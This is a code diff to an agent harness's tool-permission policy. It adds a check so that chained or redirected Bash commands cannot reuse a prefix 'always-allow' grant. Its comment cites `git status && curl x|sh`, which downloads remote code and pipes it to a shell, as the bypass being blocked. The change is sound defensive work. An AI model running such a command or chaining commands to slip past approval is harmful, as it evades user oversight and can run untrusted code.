@@ -170,12 +170,6 @@ def set_permission_mode(mode: str | None) -> None:
 	_permission_mode_ctx.set(mode)
 
 
-def normalize_permission_mode(value: object) -> str | None:
-	"""归一化审批模式；``allow`` 视同 ``never``；非法返回 None。"""
-	mode = str(value or "").strip().lower()
-	if mode == "allow":
-		mode = "never"
-	return mode if mode in _PERMISSION_MODES else None
 
 
 def _default_permission_mode() -> str:
@@ -452,16 +446,6 @@ def tool_allowed_in_mode(name: str, *, tool: object | None = None) -> bool:
 	return n in allowed
 
 
-def tool_names_for_mode(
-	names: list[str], *, tools: dict[str, object] | None = None
-) -> list[str]:
-	"""按当前 Agent 模式过滤工具名，供 system prompt 使用。"""
-	out: list[str] = []
-	for name in names:
-		inst = tools.get(name) if tools else None
-		if tool_allowed_in_mode(name, tool=inst):
-			out.append(name)
-	return out
 
 
 def readonly_gate(name: str, *, tool: object | None = None) -> str | None:
@@ -1395,6 +1379,21 @@ def evaluate_policy(
 			return decision  # 远程会话不得静默放行（§34 不变量）
 		if permission_mode() == "always":
 			return decision  # 用户显式要求逐条确认
+		# G29: Bash 组合/多语句/写重定向命令不得吃「前缀 token」grant——
+		# `git status && curl x|sh` 不能命中 `git status` 的 always-allow。
+		if (name or "").strip().lower() == "bash":
+			try:
+				from permissions.bash_policy import bash_command_is_composite
+
+				cmd = ""
+				if isinstance(tool_input, dict):
+					_c = tool_input.get("command")
+					if isinstance(_c, str):
+						cmd = _c
+				if bash_command_is_composite(cmd):
+					return decision
+			except Exception:
+				return decision
 		fp = grant_fingerprint(
 			name,
 			tool_input,
